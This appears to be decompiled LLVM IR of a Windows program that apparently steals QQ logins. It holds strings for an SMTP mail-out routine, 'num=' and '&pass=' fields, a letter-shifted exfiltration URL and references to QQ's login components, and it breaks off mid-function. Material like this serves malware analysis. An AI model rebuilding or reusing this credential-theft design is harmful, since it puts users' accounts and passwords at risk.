source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }
%_EXCEPTION_POINTERS = type { %_EXCEPTION_RECORD*, %_CONTEXT* }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_STARTUPINFOA = type { i32, i8*, i8*, i8*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_LARGE_INTEGER = type { i64 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%WSAData = type { i16, i16, i16, i16, i8*, [1 x i8], [1 x i8] }

@global_var_409000 = local_unnamed_addr global i32 0
@global_var_409094 = local_unnamed_addr global i32 0
@global_var_40a658 = local_unnamed_addr global i32 0
@global_var_40a660 = local_unnamed_addr global i32 0
@global_var_40a664 = local_unnamed_addr global i32 0
@global_var_40a678 = local_unnamed_addr global i32 0
@global_var_40a674 = local_unnamed_addr global i32 0
@global_var_40a670 = local_unnamed_addr global i32 0
@global_var_40a66c = global i32 0
@global_var_40a668 = global i32 0
@global_var_4090bc = global i32 4212308
@global_var_40a67c = local_unnamed_addr global i32 0
@global_var_40a680 = local_unnamed_addr global i32 0
@global_var_40a684 = local_unnamed_addr global i32 0
@global_var_40a688 = local_unnamed_addr global i32 0
@global_var_40a68c = local_unnamed_addr global i32 0
@global_var_40a690 = local_unnamed_addr global i32 0
@global_var_40a694 = local_unnamed_addr global i32 0
@global_var_40a698 = local_unnamed_addr global i32 0
@global_var_40a69c = local_unnamed_addr global i32 0
@global_var_404c5c = local_unnamed_addr constant i32 43
@global_var_404c74 = constant i32 37
@global_var_404cfc = local_unnamed_addr constant i32 63
@global_var_40a6a0 = local_unnamed_addr global i32 0
@global_var_404dc0 = local_unnamed_addr constant [3 x i8] c"mz\00"
@global_var_404dc4 = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_4090f8 = global i32 1
@global_var_404de0 = constant [10 x i8] c"First Run\00"
@global_var_404e9c = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_404eb8 = constant [10 x i8] c"First Run\00"
@global_var_409138 = external local_unnamed_addr global i32
@global_var_4090c0 = local_unnamed_addr global i32 0
@global_var_4090e8 = global i32 4213024
@global_var_4090f4 = local_unnamed_addr global i32 66
@global_var_4090cc = local_unnamed_addr global i32 4212320
@global_var_4090c8 = local_unnamed_addr global i32 0
@global_var_4090e4 = global i32 4212956
@global_var_4090dc = local_unnamed_addr global i32 4212820
@global_var_4090f0 = global i32 4230401
@global_var_404f64 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_404f74 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_40a6a4 = local_unnamed_addr global i32 0
@global_var_40913c = external local_unnamed_addr global i32
@global_var_405238 = constant [9 x i8] c"ComboBox\00"
@global_var_409140 = external local_unnamed_addr global i32
@global_var_40912c = external local_unnamed_addr global i32
@global_var_4090c4 = local_unnamed_addr global i32 0
@global_var_4090d8 = global i32 4212752
@global_var_40a6ac = local_unnamed_addr global i32 0
@global_var_40a6b0 = local_unnamed_addr global i32 0
@global_var_40a6a8 = local_unnamed_addr global i32 0
@global_var_4090fc = local_unnamed_addr global i32 4215688
@B64EncodeTable_at_405388 = constant [64 x i8] c"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@global_var_405a60 = constant [6 x i8] c"HELO \00"
@global_var_405a70 = constant [3 x i8] c"\0D\0A\00"
@global_var_405a7c = local_unnamed_addr constant [13 x i8] c"AUTH LOGIN\0D\0A\00"
@global_var_405a94 = constant [13 x i8] c"MAIL FROM: <\00"
@global_var_405aac = constant i32 62
@global_var_405ab8 = constant [11 x i8] c"RCPT TO: <\00"
@global_var_405acc = local_unnamed_addr constant [7 x i8] c"DATA\0D\0A\00"
@global_var_405adc = constant [8 x i8] c"From: <\00"
@global_var_405aec = constant [6 x i8] c"To: <\00"
@global_var_405afc = constant [10 x i8] c"Subject: \00"
@global_var_405b10 = constant i32 46
@global_var_40a6b8 = local_unnamed_addr global i32 0
@global_var_405b1c = local_unnamed_addr constant [7 x i8] c"QUIT\0D\0A\00"
@global_var_40a6b4 = local_unnamed_addr global i32 0
@global_var_405b66 = local_unnamed_addr constant i32 763609949
@global_var_405c88 = constant [7 x i8] c"#32770\00"
@global_var_405c98 = local_unnamed_addr constant [7 x i8] c"Button\00"
@global_var_40a6bc = local_unnamed_addr global i32 0
@global_var_40a6c4 = local_unnamed_addr global i32 0
@global_var_405ce4 = local_unnamed_addr constant i32 4218088
@global_var_405ce8 = local_unnamed_addr constant i32 841875985
@global_var_40a6c0 = local_unnamed_addr global i32 0
@global_var_409100 = local_unnamed_addr global i32 4218380
@global_var_409128 = local_unnamed_addr global i32* @global_var_4090bc
@global_var_40a6c8 = local_unnamed_addr global i32 0
@global_var_409154 = external local_unnamed_addr global i32
@global_var_406008 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_409104 = local_unnamed_addr global i32 0
@global_var_409148 = external local_unnamed_addr global i32
@global_var_409108 = local_unnamed_addr global i32 0
@global_var_40a6cc = local_unnamed_addr global i32 0
@global_var_4090ec = global i32 4213092
@global_var_409124 = local_unnamed_addr global i32* @global_var_4090ec
@global_var_406320 = constant [6 x i8] c"Down(\00"
@global_var_406330 = constant i32 41
@global_var_40633c = local_unnamed_addr constant [4 x i8] c"c:\5C\00"
@global_var_406340 = constant [5 x i8] c"Open\00"
@global_var_40a6d0 = global i32 0
@global_var_406604 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_4090e0 = local_unnamed_addr global i32 4212888
@global_var_406610 = constant i32 47
@global_var_406650 = local_unnamed_addr constant i32 64
@global_var_409158 = local_unnamed_addr global i32* @global_var_4090e4
@global_var_409144 = local_unnamed_addr global i32* @global_var_4090e8
@global_var_40665c = constant [5 x i8] c"num=\00"
@global_var_40666c = constant [7 x i8] c"&pass=\00"
@global_var_409134 = local_unnamed_addr global i32* @global_var_4090d8
@global_var_40667c = local_unnamed_addr constant [35 x i8] c"iuuq;00uftu=43992=dpn0uftu0ofx=btq\00"
@global_var_406754 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406764 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_406874 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406884 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_409130 = local_unnamed_addr global i32* @global_var_40a668
@global_var_40688c = local_unnamed_addr constant [13 x i8] c"xr, wo ai ni\00"
@global_var_40a6d4 = local_unnamed_addr global i32 0
@global_var_40a6dc = local_unnamed_addr global i32 0
@global_var_409150 = local_unnamed_addr global i32* @global_var_40a66c
@global_var_406b00 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_406b14 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_406b20 = local_unnamed_addr constant i32 47
@global_var_40690c = local_unnamed_addr constant i32 4221200
@global_var_406910 = local_unnamed_addr constant i32 841875985
@global_var_406c40 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_406c54 = constant i32 47
@global_var_406c60 = constant [3 x i8] c"\0D\0A\00"
@global_var_40a6d8 = local_unnamed_addr global i32 0
@global_var_407238 = local_unnamed_addr constant [7 x i8] c"#32770\00"
@global_var_4072e4 = local_unnamed_addr constant [5 x i8] c"Edit\00"
@global_var_40746c = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_409160 = local_unnamed_addr global i32* @global_var_4090f0
@global_var_407478 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_409120 = local_unnamed_addr global i32* @global_var_40a6d0
@global_var_40a6e0 = local_unnamed_addr global i32 0
@global_var_40a6e8 = local_unnamed_addr global i32 0
@global_var_40a6e4 = local_unnamed_addr global i32 0
@global_var_40a6ec = local_unnamed_addr global i32 0
@global_var_40a6f0 = local_unnamed_addr global i32 0
@global_var_40910c = local_unnamed_addr global i32 0
@global_var_409110 = local_unnamed_addr global i32 0
@global_var_407958 = local_unnamed_addr constant [33 x i8] c"http://jump.qq.com/clienturl_157\00"
@global_var_40797c = constant [33 x i8] c"http://jump.qq.com/clienturl_156\00"
@global_var_409114 = local_unnamed_addr global i32 0
@global_var_407a10 = constant [11 x i8] c"user32.dll\00"
@global_var_407a1c = constant [11 x i8] c"LoadImageA\00"
@global_var_407a28 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.DLL\00"
@global_var_407608 = local_unnamed_addr constant i32 4224596
@global_var_407654 = local_unnamed_addr constant i32 1867011080
@global_var_407a38 = constant [12 x i8] c"LoadStringA\00"
@global_var_407a44 = local_unnamed_addr constant [10 x i8] c"MFC42.DLL\00"
@global_var_407a50 = constant [12 x i8] c"shell32.dll\00"
@global_var_407a5c = constant [14 x i8] c"ShellExecuteA\00"
@global_var_407a6c = local_unnamed_addr constant [16 x i8] c"QQHELPERDLL.DLL\00"
@global_var_40910d = local_unnamed_addr global i32 0
@global_var_40a6f4 = local_unnamed_addr global i32 0
@global_var_407af0 = local_unnamed_addr constant [75 x i8] c"skdjfksndffgjfgjksndkfdhsfdhsfhsfhfghjfasdlkajsdkjalskdjaskldjaklsdjalksjd\00"
@global_var_40a6f8 = local_unnamed_addr global i32 0
@global_var_407bf4 = local_unnamed_addr constant i32 31
@global_var_40a808 = local_unnamed_addr global i32 0
@global_var_40a810 = local_unnamed_addr global i32 0
@global_var_40a814 = local_unnamed_addr global i32 0
@global_var_407fac = local_unnamed_addr constant [7 x i8] c"QQ.exe\00"
@global_var_40a80c = local_unnamed_addr global i32 0
@global_var_407fbc = local_unnamed_addr constant [13 x i8] c"npkcrypt.sys\00"
@global_var_407fd4 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.dll\00"
@global_var_409118 = local_unnamed_addr global i32 0
@global_var_407fec = local_unnamed_addr constant [13 x i8] c"Fyqmpsfs=fyf\00"
@global_var_407ffc = constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_40800c = constant [8 x i8] c"ListBox\00"
@global_var_40a818 = global i32 0
@global_var_40801c = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_40a654 = local_unnamed_addr global i32 0
@0 = external global i32
@global_var_40a5ac = local_unnamed_addr global i8 0
@1 = internal constant [12 x i8] c"aixiaran\10H@\00"
@global_var_4090d0 = global i8* getelementptr inbounds ([12 x i8], [12 x i8]* @1, i32 0, i32 0)
@global_var_40a650 = local_unnamed_addr global i32 (i32, i32, i32)* null
@global_var_40a700 = external global i8*

declare i32 @unknown_4e40() local_unnamed_addr

declare i32 @unknown_4f18() local_unnamed_addr

define i32* @GetStdHandle.19(i32 %nStdHandle) local_unnamed_addr {
dec_label_pc_401060:
  %0 = call i32* @GetStdHandle(i32 %nStdHandle), !insn.addr !0
  ret i32* %0, !insn.addr !0
}

define void @RaiseException.40(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments) local_unnamed_addr {
dec_label_pc_401068:
  call void @RaiseException(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments), !insn.addr !1
  ret void, !insn.addr !1
}

define void @RtlUnwind.41(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue) local_unnamed_addr {
dec_label_pc_401070:
  call void @RtlUnwind(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue), !insn.addr !2
  ret void, !insn.addr !2
}

define i32 @UnhandledExceptionFilter.33(%_EXCEPTION_POINTERS* %ExceptionInfo) local_unnamed_addr {
dec_label_pc_401078:
  %0 = call i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS* %ExceptionInfo), !insn.addr !3
  ret i32 %0, !insn.addr !3
}

define i1 @WriteFile.20(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_401080:
  %0 = call i1 @WriteFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped), !insn.addr !4
  ret i1 %0, !insn.addr !4
}

define void @ExitProcess.18(i32 %uExitCode) local_unnamed_addr {
dec_label_pc_401088:
  call void @ExitProcess(i32 %uExitCode), !insn.addr !5
  ret void, !insn.addr !5
}

define i32 @MessageBox(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType) local_unnamed_addr {
dec_label_pc_401090:
  %0 = call i32 @MessageBoxA(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i1 @FreeLibrary.17(i32* %hLibModule) local_unnamed_addr {
dec_label_pc_401098:
  %0 = call i1 @FreeLibrary(i32* %hLibModule), !insn.addr !7
  ret i1 %0, !insn.addr !7
}

define i8* @GetCommandLine() local_unnamed_addr {
dec_label_pc_4010a0:
  %0 = call i8* @GetCommandLineA(), !insn.addr !8
  ret i8* %0, !insn.addr !8
}

define i32 @GetLocaleInfo(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData) local_unnamed_addr {
dec_label_pc_4010a8:
  %0 = call i32 @GetLocaleInfoA(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData), !insn.addr !9
  ret i32 %0, !insn.addr !9
}

define void @GetStartupInfo(%_STARTUPINFOA* %lpStartupInfo) local_unnamed_addr {
dec_label_pc_4010b0:
  call void @GetStartupInfoA(%_STARTUPINFOA* %lpStartupInfo), !insn.addr !10
  ret void, !insn.addr !10
}

define i32 @GetThreadLocale.35() local_unnamed_addr {
dec_label_pc_4010b8:
  %0 = call i32 @GetThreadLocale(), !insn.addr !11
  ret i32 %0, !insn.addr !11
}

define i32 @RegCloseKey.32(i32* %hKey) local_unnamed_addr {
dec_label_pc_4010c0:
  %0 = call i32 @RegCloseKey(i32* %hKey), !insn.addr !12
  ret i32 %0, !insn.addr !12
}

define i32 @RegOpenKeyEx(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult) local_unnamed_addr {
dec_label_pc_4010c8:
  %0 = call i32 @RegOpenKeyExA(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult), !insn.addr !13
  ret i32 %0, !insn.addr !13
}

define i32 @RegQueryValueEx(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData) local_unnamed_addr {
dec_label_pc_4010d0:
  %0 = call i32 @RegQueryValueExA(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData), !insn.addr !14
  ret i32 %0, !insn.addr !14
}

define i32 @SysReAllocStringLen.25(i16** %pbstr, i16* %psz, i32 %len) local_unnamed_addr {
dec_label_pc_4010d8:
  %0 = call i32 @SysReAllocStringLen(i16** %pbstr, i16* %psz, i32 %len), !insn.addr !15
  ret i32 %0, !insn.addr !15
}

define void @SysFreeString.26(i16* %bstrString) local_unnamed_addr {
dec_label_pc_4010e0:
  call void @SysFreeString(i16* %bstrString), !insn.addr !16
  ret void, !insn.addr !16
}

define i32 @GetCurrentThreadId.36() local_unnamed_addr {
dec_label_pc_4010e8:
  %0 = call i32 @GetCurrentThreadId(), !insn.addr !17
  ret i32 %0, !insn.addr !17
}

define i32 @GetVersion.34() local_unnamed_addr {
dec_label_pc_4010f0:
  %0 = call i32 @GetVersion(), !insn.addr !18
  ret i32 %0, !insn.addr !18
}

define i1 @QueryPerformanceCounter.29(%_LARGE_INTEGER* %lpPerformanceCount) local_unnamed_addr {
dec_label_pc_4010f8:
  %0 = call i1 @QueryPerformanceCounter(%_LARGE_INTEGER* %lpPerformanceCount), !insn.addr !19
  ret i1 %0, !insn.addr !19
}

define i32 @GetTickCount.30() local_unnamed_addr {
dec_label_pc_401100:
  %0 = call i32 @GetTickCount(), !insn.addr !20
  ret i32 %0, !insn.addr !20
}

define i32* @LocalAlloc.15(i32 %uFlags, i32 %uBytes) local_unnamed_addr {
dec_label_pc_40112c:
  %0 = call i32* @LocalAlloc(i32 %uFlags, i32 %uBytes), !insn.addr !21
  ret i32* %0, !insn.addr !21
}

define i32* @LocalFree.27(i32* %hMem) local_unnamed_addr {
dec_label_pc_401134:
  %0 = call i32* @LocalFree(i32* %hMem), !insn.addr !22
  ret i32* %0, !insn.addr !22
}

define i32* @VirtualAlloc.21(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect) local_unnamed_addr {
dec_label_pc_40113c:
  %0 = call i32* @VirtualAlloc(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect), !insn.addr !23
  ret i32* %0, !insn.addr !23
}

define i1 @VirtualFree.16(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType) local_unnamed_addr {
dec_label_pc_401144:
  %0 = call i1 @VirtualFree(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType), !insn.addr !24
  ret i1 %0, !insn.addr !24
}

define void @InitializeCriticalSection.14(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40114c:
  call void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !25
  ret void, !insn.addr !25
}

define void @EnterCriticalSection.12(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401154:
  call void @EnterCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !26
  ret void, !insn.addr !26
}

define void @LeaveCriticalSection.13(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40115c:
  call void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !27
  ret void, !insn.addr !27
}

define void @DeleteCriticalSection.28(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401164:
  call void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !28
  ret void, !insn.addr !28
}

define i32 @InitAllocator.42() local_unnamed_addr {
dec_label_pc_4018ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !29
  ret i32 %0, !insn.addr !29
}

define i32 @function_4018b3() local_unnamed_addr {
dec_label_pc_4018b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !30
}

define i32 @function_4018b5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4018b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i8, i8* @global_var_40a5ac, align 1, !insn.addr !31
  %2 = zext i8 %1 to i32, !insn.addr !31
  %3 = and i32 %0, -256, !insn.addr !31
  %4 = or i32 %3, %2, !insn.addr !31
  ret i32 %4, !insn.addr !32
}

define i32 @SysGetMem.43() local_unnamed_addr {
dec_label_pc_402060:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !33
  ret i32 %0, !insn.addr !33
}

define i32 @function_402065() local_unnamed_addr {
dec_label_pc_402065:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !34
}

define i32 @function_402067(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_402067:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !35
  %2 = inttoptr i32 %1 to i32*, !insn.addr !35
  %3 = load i32, i32* %2, align 4, !insn.addr !35
  ret i32 %3, !insn.addr !36
}

define i32 @SysFreeMem.44() local_unnamed_addr {
dec_label_pc_402206:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !37
  ret i32 %0, !insn.addr !37
}

define i32 @function_40220b() local_unnamed_addr {
dec_label_pc_40220b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !38
}

define i32 @function_40220d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40220d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !39
  %2 = inttoptr i32 %1 to i32*, !insn.addr !39
  %3 = load i32, i32* %2, align 4, !insn.addr !39
  ret i32 %3, !insn.addr !40
}

define i32 @SysReallocMem.45() local_unnamed_addr {
dec_label_pc_4024a5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !41
  ret i32 %0, !insn.addr !41
}

define i32 @function_4024aa() local_unnamed_addr {
dec_label_pc_4024aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !42
}

define i32 @function_4024ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4024ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !43
  %2 = inttoptr i32 %1 to i32*, !insn.addr !43
  %3 = load i32, i32* %2, align 4, !insn.addr !43
  ret i32 %3, !insn.addr !44
}

define i32 @function_402553() local_unnamed_addr {
dec_label_pc_402553:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !45
}

define i32 @function_40259b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40259b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !46
}

define i32 @function_4025ab() local_unnamed_addr {
dec_label_pc_4025ab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !47
}

declare i32 @Move() local_unnamed_addr

declare i32 @"@PStrNCpy"() local_unnamed_addr

declare i32 @"@FillChar"() local_unnamed_addr

declare i32 @"@Str0Long"(i32, i32) local_unnamed_addr

define i32 @GetKeyboardType.31(i32 %nTypeFlag) local_unnamed_addr {
dec_label_pc_4028b0:
  %0 = call i32 @GetKeyboardType(i32 %nTypeFlag), !insn.addr !48
  ret i32 %0, !insn.addr !48
}

define i32 @function_402ab4() local_unnamed_addr {
dec_label_pc_402ab4:
  ret i32 -2147418113, !insn.addr !49
}

define i32 @function_402abc() local_unnamed_addr {
dec_label_pc_402abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !50
}

define i32 @function_402ac0() local_unnamed_addr {
dec_label_pc_402ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !51
}

define i32 @function_402ac4() local_unnamed_addr {
dec_label_pc_402ac4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !52
}

define i32 @function_402aee() local_unnamed_addr {
dec_label_pc_402aee:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !53
}

declare i32 @"@ClassCreate"(i32, i32, i32, i32, i32) local_unnamed_addr

define i32 @"@ClassCreate.46"() local_unnamed_addr {
dec_label_pc_402b19:
  %0 = call i32 @"@HandleAnyException"(), !insn.addr !54
  ret i32 %0, !insn.addr !54
}

define i32 @function_402b1e(i32 %arg1) local_unnamed_addr {
dec_label_pc_402b1e:
  %0 = add i32 %arg1, 12, !insn.addr !55
  %1 = inttoptr i32 %0 to i32*, !insn.addr !55
  %2 = load i32, i32* %1, align 4, !insn.addr !55
  %3 = icmp eq i32 %2, 0, !insn.addr !56
  br i1 %3, label %dec_label_pc_402b37, label %dec_label_pc_402b29, !insn.addr !57

dec_label_pc_402b29:                              ; preds = %dec_label_pc_402b1e
  %4 = call i32 @"@ClassDestroy"(), !insn.addr !58
  br label %dec_label_pc_402b37, !insn.addr !58

dec_label_pc_402b37:                              ; preds = %dec_label_pc_402b29, %dec_label_pc_402b1e
  %5 = call i32 @"@RaiseAgain"(), !insn.addr !59
  ret i32 %5, !insn.addr !60
}

declare i32 @"@ClassDestroy"() local_unnamed_addr

define i32 @function_402b48() local_unnamed_addr {
dec_label_pc_402b48:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !61
}

declare i32 @"@BeforeDestruction"(i32, i32) local_unnamed_addr

declare i32 @"@HandleAnyException"() local_unnamed_addr

declare i32 @"@HandleFinally"() local_unnamed_addr

declare i32 @"@RaiseAgain"() local_unnamed_addr

define i32 @function_402e3f() local_unnamed_addr {
dec_label_pc_402e3f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !62
}

define i32 @function_402e55() local_unnamed_addr {
dec_label_pc_402e55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !63
}

define i32 @function_402ef4(i32 %arg1) local_unnamed_addr {
dec_label_pc_402ef4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !64
}

define i32 @function_403167() local_unnamed_addr {
dec_label_pc_403167:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !65
}

define i32 @function_4031f1() local_unnamed_addr {
dec_label_pc_4031f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !66
}

declare i32 @"@Halt0"() local_unnamed_addr

define i32 @function_403353(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_403353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !67
}

define i32 @"@Halt"() local_unnamed_addr {
dec_label_pc_403358:
  %0 = call i32 @"@Halt0"(), !insn.addr !68
  unreachable, !insn.addr !68
}

define i32 @function_403362() local_unnamed_addr {
dec_label_pc_403362:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !69
}

define i32 @function_40336f() local_unnamed_addr {
dec_label_pc_40336f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !70
}

declare i32 @"@LStrClr"() local_unnamed_addr

declare i32 @"@LStrArrayClr"() local_unnamed_addr

declare i32 @"@LStrAsg"() local_unnamed_addr

declare i32 @"@LStrFromChar"() local_unnamed_addr

declare i32 @"@LStrFromPChar"() local_unnamed_addr

define i32 @function_4034a0() local_unnamed_addr {
dec_label_pc_4034a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !71
}

declare i32 @"@LStrFromString"() local_unnamed_addr

define i32 @function_4034ae() local_unnamed_addr {
dec_label_pc_4034ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !72
}

declare i32 @"@LStrFromArray"() local_unnamed_addr

define i32 @function_4034c7() local_unnamed_addr {
dec_label_pc_4034c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !73
}

define i32 @function_4034c8() local_unnamed_addr {
dec_label_pc_4034c8:
  %eax.0.reg2mem = alloca i32, !insn.addr !74
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !74
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !75
  br i1 %1, label %dec_label_pc_4034cf, label %dec_label_pc_4034cc, !insn.addr !75

dec_label_pc_4034cc:                              ; preds = %dec_label_pc_4034c8
  %2 = add i32 %0, -4, !insn.addr !76
  %3 = inttoptr i32 %2 to i32*, !insn.addr !76
  %4 = load i32, i32* %3, align 4, !insn.addr !76
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !76
  br label %dec_label_pc_4034cf, !insn.addr !76

dec_label_pc_4034cf:                              ; preds = %dec_label_pc_4034cc, %dec_label_pc_4034c8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !77
}

declare i32 @"@LStrCat"() local_unnamed_addr

declare i32 @"@LStrCat3"() local_unnamed_addr

define i32 @function_403587() local_unnamed_addr {
dec_label_pc_403587:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !78
}

declare i32 @"@LStrCatN"() local_unnamed_addr

define i32 @function_403611() local_unnamed_addr {
dec_label_pc_403611:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !79
}

declare i32 @"@LStrCmp"() local_unnamed_addr

define i32 @function_4036b8() local_unnamed_addr {
dec_label_pc_4036b8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !80
  br i1 %1, label %dec_label_pc_4036c6, label %dec_label_pc_4036bc, !insn.addr !81

dec_label_pc_4036bc:                              ; preds = %dec_label_pc_4036b8
  %2 = add i32 %0, -8, !insn.addr !82
